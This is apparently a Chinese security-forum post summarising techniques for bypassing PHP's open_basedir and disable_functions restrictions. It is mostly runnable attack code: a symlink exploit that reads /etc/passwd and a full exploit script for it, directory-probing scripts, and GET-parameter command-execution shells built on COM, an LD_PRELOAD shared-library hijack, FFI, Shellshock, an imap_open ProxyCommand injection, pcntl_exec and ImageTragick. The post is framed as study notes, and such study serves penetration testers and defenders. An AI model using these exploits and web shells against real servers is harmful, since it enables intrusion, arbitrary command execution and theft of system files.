前言
--

最近在学习php,对如何绕过disable\_functions和open\_basedir的限制进行学习总结。

bypass open\_basedir
====================

open\_basedir
-------------

open\_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。  
在`php.ini`中设置`open_basedir`的值

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-28ad8ebd9db3559fc6cd58b9d2416573b1f1d67f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-28ad8ebd9db3559fc6cd58b9d2416573b1f1d67f.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ca8daba407b1b83fe7dfba30ffbd0619dc600428.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ca8daba407b1b83fe7dfba30ffbd0619dc600428.png)

设置`open_basedir=/var/www/html/`,通过web访问服务器的用户就无法获取服务器上除了`/var/www/html/`这个目录以外的文件。  
假设这时连接一个webshell,当webshell工具尝试遍历和读取其他目录时将会失败。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cc8f90de665dd2e442f8313340b6afffa0d4ad01.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cc8f90de665dd2e442f8313340b6afffa0d4ad01.png)

通过系统命令函数
--------

`open_basedir`对命令执行函数没有限,使用`system()`函数试一下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2c55910f1c5db0a2355c6ad924d6543dc63d39b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2c55910f1c5db0a2355c6ad924d6543dc63d39b.png)

能够遍历上上级目录,而在webshell工具中时被禁止的,说明确实能够绕过  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-df7f6a3b7ad5cf09fbf40e138b604ea03069d57c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-df7f6a3b7ad5cf09fbf40e138b604ea03069d57c.png)

实际情况中,可能`system()`函数由于disable\_function禁用无法使用,可通过同类执行命令函数绕过。

利用glob://绕过
-----------

### glob://伪协议

`glob://`是查找匹配的文件路径模式,`glob`数据流包装器自 PHP 5.3.0 起开始有效。  
下面是[官方](https://www.php.net/manual/zh/wrappers.glob.php)的一个domo

```php
<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?>
```

需要和其他函数配合,单独的glob是无法绕过的。  
并且局限性在于它们都只能列出根目录下和open\_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

### 利用 DirectoryIterator+glob://

`DirectoryIterator` 类提供了一个简单的界面来查看文件系统目录的内容。  
脚本如下:

```php
<?php
$c = $_GET['c'];
$a = new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-151ffebb76d78ad62bad8cb05b3bb3bc6c0dfb15.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-151ffebb76d78ad62bad8cb05b3bb3bc6c0dfb15.png)

### 利用 opendir()+readdir()+glob://

`opendir`作用为打开目录句柄  
`readdir`作用为从目录句柄中读取目录

脚本如下

```php
<?php
$a = $_GET['c'];
if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```

只能列目录，php7可以用如下方法读非根目录文件,`glob:///*/www/../*` 可列举 `/var`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fac84e27c3820ea5ecc1b60b4eff07e198cbf20e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fac84e27c3820ea5ecc1b60b4eff07e198cbf20e.png)

### 利用 scandir()+glob://

`scandir()`函数可以列出指定路径中的文件和目录  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b60358ef17f699052ebf9d755ea1d75dc99d803.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b60358ef17f699052ebf9d755ea1d75dc99d803.png)

这种方法也只能列出根目录和open\_basedir允许目录下的文件。

利用symlink绕过
-----------

`symlink()`函数创建一个从指定名称连接的现存目标文件开始的符号连接。

```php
symlink(string $target, string $link): bool
```

symlink()对于已有的 target 建立一个名为 link 的符号连接。  
而target一般情况下受限于open\_basedir。  
官方的domo:

```php
<?php
$target = 'uploads.php';
$link = 'uploads';
symlink($target, $link);

echo readlink($link);
# 将会输出'uploads.php'这个字符串
?>
```

如果将要读取`/etc/passwd`poc如下

```php
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("A/B/C/D","SD");
symlink("SD/../../../../etc/passwd","POC");
unlink("SD");
mkdir("SD");
?>
```

访问web后,将会生成名为POC的文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ab3a53449c13b418c80c4ebc23d83b1ce5045756.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ab3a53449c13b418c80c4ebc23d83b1ce5045756.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4bd57c3eea42aa9f2f89541d2b973e29b1d075f5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4bd57c3eea42aa9f2f89541d2b973e29b1d075f5.png)

分析一下poc过程:

1. 创建A/B/C/D目录，并返回到起始目录
2. `symlink("A/B/C/D","SD")`:创建符号文件SD,指向A/B/C/D
3. `symlink("SD/../../../../etc/passwd","POC")`:创建符号文件POC,指向`SD/../../../../etc/passwd`。此时SD=A/B/C/D,而`A/B/C/D../../../../`=`/var/www/html`,符合open\_basedir的限制,创建成功。
4. unlink("SD"):删除软链接SD，并创建一个文件夹,此时SD作为一个真正的目录存在。那么访问POC,指向的是`SD/../../../../etc/passwd`,`SD/../../../`就是/var目录,`/var/../etc/passwd`恰好可以读取到etc目录下的passwd，从而达到跨目录访问的效果。

这里需要跨几层目录就需要创建几层目录。

最后附上p牛EXP

```php
<?php
/* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');

function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);

  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;

  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}

function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') &amp;&amp; ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}

function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}

function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```

利用bindtextdomain和SplFileInfo方法
------------------------------

bindtextdomain设置或获取域名的路径，函数原型为:

```php
bindtextdomain(string $domain, ?string $directory): string|false
```

利用原理是基于报错：`bindtextdomain()`函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。  
`SplFileInfo`函数类似。  
poc

```php
<?php
printf('<b>open_basedir: %s</b><br />', ini_get('open_basedir'));
$re = bindtextdomain('xxx', $_GET['dir']);
var_dump($re);
?>
```

```php
<?php
printf('<b>open_basedir: %s</b><br />', ini_get('open_basedir'));
$info = new SplFileInfo($_GET['dir']);
var_dump($info->getRealPath());
?>
```

如果成功访问到存在的文件是会返回该文件路径：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-55c77bb99ba1897f020c2effd95de1404147486c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-55c77bb99ba1897f020c2effd95de1404147486c.png)

而如果访问到不存在的文件就会返回`false`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c3cbf24a92e8b4b51c4aad21023a4a9be68ca04a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c3cbf24a92e8b4b51c4aad21023a4a9be68ca04a.png)

这个方法感觉非常鸡肋,用起来比较恶心，最好与其他方法组合使用。

利用SplFileInfo::getRealPath()方法
------------------------------

(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)  
SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口。  
而其中`getRealPath()`用于获取文件的绝对路径。bypass原理同样是基于报错，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open\_basedir的设定。

脚本如下

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("open_basedir: %s <br/><br/>", ini_get('open_basedir'));
$basedir = 'D:/CSGO/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) {
    $info = new SplFileInfo($basedir . $chars[$i] . '<<');
    $re = $info->getRealPath();
    if ($re) {
        echo $re."<br>";
    }
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9d48b18d870664dec859f15215ed0a7eed5592b0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9d48b18d870664dec859f15215ed0a7eed5592b0.png)

利用realpath列目录
-------------

环境要求:Windows

realpath()返回规范化的绝对路径名,它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。

```php
realpath(string $path): string|false
```

bypass原理:  
与上面说到的两种方式类似。在开启了open\_basedir的情况下，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open\_basedir里的文件的话，他就会返回`file is not within the allowed path(s)`，有点像盲注,基于报错来判断文件名。

脚本入下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'D:/5E/5EClient/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) {
        $file = $dir . $chars[$i] . '<><';
        realpath($file);
}
function isexists($errno, $errstr)
{
        $regexp = '/File\((.*)\) is not within/';
        preg_match($regexp, $errstr, $matches);
        if (isset($matches[1])) {
                printf("%s <br/>", $matches[1]);
        }
}
?>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b82c2a4bc7a197b24d64e458b05f70ab3a16a461.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b82c2a4bc7a197b24d64e458b05f70ab3a16a461.png)

利用chdir与ini\_set
----------------

`chdir`将工作目录切换到指定的目录,函数原型为

```php
chdir(string $directory): bool
```

`ini_set`i用来设置php.ini的值，无需打开php.ini文件，就能修改配置。函数原型为:

```php
ini_set(string $option, string $value): string|false
```

设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。

bypass原理大概open\_basedir设计逻辑的安全问题  
分析过程参考:[从PHP底层看open\_basedir bypass](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/)

一个小demo，将该文件放到网站目录下:

```php
<?php
echo 'open_basedir: '.ini_get('open_basedir').'<br>';
echo 'GET: '.$_GET['c'].'<br>';
eval($_GET['c']);
echo 'open_basedir: '.ini_get('open_basedir');
?>
```

构造payload

```php
mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15c6b9de9f60d61748fbd3897af60bbbdd73fc3f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15c6b9de9f60d61748fbd3897af60bbbdd73fc3f.png)  
open\_basedir被设置成了'\\',失去原有的限制。

bypass disable\_functions
=========================

disable\_functions
------------------

disable\_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f5b298dc9c356a214a0220d1d2f103faea061f37.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f5b298dc9c356a214a0220d1d2f103faea061f37.png)

比如拿到一个webshell,用管理工具去连接,执行命令发现`ret=127`,实际上就是因为被这个限制的原因

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc2bf483cc00200c44940106a3a472957a93b665.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc2bf483cc00200c44940106a3a472957a93b665.png)

黑名单
---

```php
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
```

观察php.ini 中的 disable\_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。

利用Windows组件COM绕过
----------------

查看`com.allow_dcom`是否开启,这个默认是不开启的。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7771bdcf3afa5556110bd63e0466d944557d46a8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7771bdcf3afa5556110bd63e0466d944557d46a8.png)

创建一个COM对象,通过调用COM对象的`exec`替我们执行命令

```php
<?php
$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
if($wsh == 'wscript') {
    $command = $_GET['cmd'];
    $wshit = new COM('WScript.shell') or die("Create Wscript.Shell Failed!");
    $exec = $wshit->exec("cmd /c".$command);
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
}
elseif($wsh == 'application') {
    $command = $_GET['cmd'];
    $wshit = new COM("Shell.Application") or die("Shell.Application Failed!");
    $exec = $wshit->ShellExecute("cmd","/c ".$command);
} 
else {
  echo(0);
}
?>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6e936a40e4302e8c33b996e973ec29907af58a0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6e936a40e4302e8c33b996e973ec29907af58a0.png)

利用Linux环境变量LD\_PRELOAD
----------------------

### 初阶

```php
LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。
```

总的来说就是=`LD_PRELOAD`指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。

思路为:

1. 创建一个.so文件,linux的动态链接库文件
2. 使用putenv函数将`LD_PRELOAD`路径设置为我们自己创建的动态链接库文件
3. 利用某个函数去触发该动态链接库

这里以`mail()`函数举例。  
在底层c语言中,`mail.c`中会调用`sendmail`，而sendmail\_path使从ini文件中说明

```php
; For Unix only.  You may supply arguments as well (default: "sendmail -t -i"). 
;sendmail_path =
```

默认为"sendmail -t -i"  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0fae5e50c44059dcd16c1f83bf9390d671118cb2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0fae5e50c44059dcd16c1f83bf9390d671118cb2.png)

但是sendmail并不是默认安装的,需要自己下载

使用命令`readelf -Ws /usr/sbin/sendmail`可以看到sendmail调用了哪些库函数,这里选择`geteuid`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a77954d58f5f0eb25ba80c303c0a2bf05010d1db.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a77954d58f5f0eb25ba80c303c0a2bf05010d1db.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ad3fd7f9a5eb6471437c4ac51c2892b3f4f27a95.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ad3fd7f9a5eb6471437c4ac51c2892b3f4f27a95.png)

创建一个`test.c`文件,并定义一个`geteuid`函数,目的是劫持该函数。

```php
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
    system("whoami > /var/tmp/sd.txt");
}
int geteuid()
{
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

使用gcc编译为.so文件

```powershell
gcc -c -fPIC test.c -o test
gcc -shared test -o test.so
```

这里有个坑:不要在windows上编译,编译出来是MZ头,不是ELF。

然后再上传test.so到指定目录下。

最后创建`shell.php`文件,上传到网站目录下,这里.so文件路径要写对。

```php
<?php
putenv("LD_PRELOAD=/var/www/test.so");
mail("","","","","");
?>
```

再理一下整个过程:当我们访问shell.php文件的时候,先会将`LD_PRELOAD`路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的`whoami`命令写入到sd.txt中。

由于拿到的webshell很有可能是`www-data`这种普通权限。  
整个过程要注意权限问题,要可写的目录下。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-633c816b7c12773b13b363c703b8396621f98139.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-633c816b7c12773b13b363c703b8396621f98139.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e6eca9414df099f19277e57a340aafe9566f235.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e6eca9414df099f19277e57a340aafe9566f235.png)

web访问页面没有文件写出,可以看看定义的目录是否有权限。

### 进阶版

在整个流程中,唯一担心的是sendmail没有安装怎么办,它可不是默认安装的,而拿到的webshell权限一般也不高,无法自行安装,也不能改php.ini。

而有前辈早已指出:[无需sendmail：巧用LD\_PRELOAD突破disable\_functions](https://www.freebuf.com/web/192052.html)  
细节已经说的非常明白,这里只复现,在此不再画蛇添足。

去github下载三个重要文件:  
bypass\_disablefunc.php,bypass\_disablefunc\_x64.so或bypass\_disablefunc\_x86.so,bypass\_disablefunc.c  
将 bypass\_disablefunc.php 和 bypass\_disablefunc\_x64.so传到目标有权限的目录中。  
这里很有可能无法直接上传到web目录,解决办法就是上传到有权限的目录下,并用include去包含。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-40696d4ff28d60bf4ebb5f78951a29b25ab8905b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-40696d4ff28d60bf4ebb5f78951a29b25ab8905b.png)

这里我已经卸载了sendmail文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af1ed6c4860e250243b166fdc660265b2a05962d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af1ed6c4860e250243b166fdc660265b2a05962d.png)

注意区分post和get  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-992a98bb47e6e4a4a9e42a55d4dd30778f804a65.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-992a98bb47e6e4a4a9e42a55d4dd30778f804a65.png)

利用PHP7.4 FFI绕过
--------------

FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。  
当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable\_functions。  
具体请参考[Foreign Function Interface](https://www.php.net/manual/en/book.ffi.php)

当前php版本为7.4.3  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cb3f223efe30a667dc7bade03e5e9d229dadde34.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cb3f223efe30a667dc7bade03e5e9d229dadde34.png)

先看FFI是否开启,并且ffi.enable需要设置为true  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b35c0189e736b04eb0ed54c196e58a69d892cc94.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b35c0189e736b04eb0ed54c196e58a69d892cc94.png)

使用FFI::cdef创建一个新的FFI对象  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5bc4069622e8f5115a3d6f1da21ce737d3c743f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5bc4069622e8f5115a3d6f1da21ce737d3c743f.png)

通过c语言的system去执行,绕过disable functions。  
将返回结果写入/tmp/SD，并在每次读出结果后用unlink()函数删除它。

```php
<?php
$cmd=$_GET['cmd'];
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("$cmd > /tmp/SD");       //由GET传参的任意代码执行
echo file_get_contents("/tmp/SD");
@unlink("/tmp/SD");
?>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-590a157f26e1522e1619d7509649cf033f41aede.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-590a157f26e1522e1619d7509649cf033f41aede.png)

利用Bash Shellshock(CVE-2014-6271)破壳漏洞
------------------------------------

利用条件php &lt; 5.6.2 &amp; bash &lt;= 4.3（破壳）

Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

简单测试是否存在破壳漏洞:  
命令行输入`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`  
如果输出了`vulnerable`，则说明存在bash破壳漏洞  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-816821af662f38b1f35ce71d74e06ae893f78191.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-816821af662f38b1f35ce71d74e06ae893f78191.png)

[EXP](https://www.exploit-db.com/exploits/35146)如下:

```php
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   error_log('a',1);
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>     
```

选择可上传目录路径,上传exp  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-26a0daa755588381cff00eac3f7265edb02596d5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-26a0daa755588381cff00eac3f7265edb02596d5.png)

包含文件执行  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-905ab0ad921571e725edbd49af4787e5b5ea2fa2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-905ab0ad921571e725edbd49af4787e5b5ea2fa2.png)

利用imap\_open()绕过
----------------

利用条件需要安装iamp扩展,命令行输入:`apt-get install php-imap`  
在php.ini中开启imap.enable\_insecure\_rsh选项为On；重启服务。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6e3eed7a045e2b790bed7bcd59f8fef9165057ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6e3eed7a045e2b790bed7bcd59f8fef9165057ff.png)

基本原理为:

```php
PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。
```

EXP:

```php
<?php 
error_reporting(0); 
if (!function_exists('imap_open')) { 
die("no imap_open function!"); 
} 
$server = "x -oProxyCommand=echot" . base64_encode($_GET['cmd'] .
">/tmp/cmd_result") . "|base64t-d|sh}"; 
//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] .
">/tmp/cmd_result") . '|base64$IFS$()-d|sh}'; 
imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or
var_dump("nnError: ".imap_last_error()); 
sleep(5); 
echo file_get_contents("/tmp/cmd_result"); 
?>
```

利用Pcntl组件
---------

如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl\_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。

[exp](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/pcntl_exec/exp.php)为:

```php
#pcntl_exec().php
<?php pcntl_exec("/bin/bash", array("/tmp/b4dboy.sh"));?>
#/tmp/b4dboy.sh
#!/bin/bash
ls -l /
```

利用ImageMagick 漏洞绕过(CVE-2016–3714)
---------------------------------

利用条件:

- 目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）
- 安装了php-imagick拓展并在php.ini中启用；
- 编写php通过new Imagick对象的方式来处理图片等格式文件；
- PHP &gt;= 5.4

### ImageMagick介绍

ImageMagick是一套功能强大、稳定而且开源的工具集和开发包,可以用来读、写和处理超过89种基本格式的图片文件,包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。众多的网站平台都是用他渲染处理图片。可惜在3号时被公开了一些列漏洞,其中一个漏洞可导致远程执行代码(RCE),如果你处理用户提交的图片。该漏洞是针对在野外使用此漏洞。许多图像处理插件依赖于ImageMagick库,包括但不限于PHP的imagick,Ruby的rmagick和paperclip,以及NodeJS的ImageMagick等。

产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。

据ImageMagick官方，目前程序存在一处远程命令执行漏洞（CVE-2016-3714），当其处理的上传图片带有攻击代码时，可远程实现远程命令执行，进而可能控制服务器，此漏洞被命名为ImageTragick。  
[EXP](https://www.exploit-db.com/exploits/39766)如下:

```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";

$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}

$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;

file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

漏洞原理参考p牛文章:<https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html>

### 漏洞复现

获取和运行镜像

```php
docker pull medicean/vulapps:i_imagemagick_1
docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1
```

访问`phpinfo.php`,发现开启了imagemagick服务  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ec45d667e4edaa958bee7232a924272efdebe343.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ec45d667e4edaa958bee7232a924272efdebe343.png)

进入容器:`docker run -t -i medicean/vulapps:i_imagemagick_1  "/bin/bash"`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d4a7ef734a75ba9f5a626b88873ae71b51356a26.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d4a7ef734a75ba9f5a626b88873ae71b51356a26.png)

查看`poc.php`,这其实是已经写好的poc,执行命令就是`ls -la`  
